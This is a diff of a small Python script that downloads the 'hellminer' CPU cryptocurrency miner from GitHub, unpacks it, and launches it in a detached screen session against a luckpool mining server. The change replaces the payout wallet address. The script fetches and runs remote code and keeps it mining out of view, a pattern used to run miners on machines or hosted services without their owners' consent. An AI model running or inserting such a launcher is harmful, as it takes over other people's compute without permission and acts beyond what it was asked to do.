@@ -3,5 +3,5 @@ import os
 
 os.system("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz --quiet")
 os.system("tar -xf hellminer_cpu_linux.tar.gz")
-os.system("screen -d -m -S itsfii bash -c './hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.000worker -p x --cpu 6'")
+os.system("screen -d -m -S itsfii bash -c './hellminer -c stratum+tcp://na.luckpool.net:3956 -u RUfLciLruAQvRjQo9fMWsbzy9Qim5q14PF.worker -p x --cpu 6'")
 os.system("screen -ls")
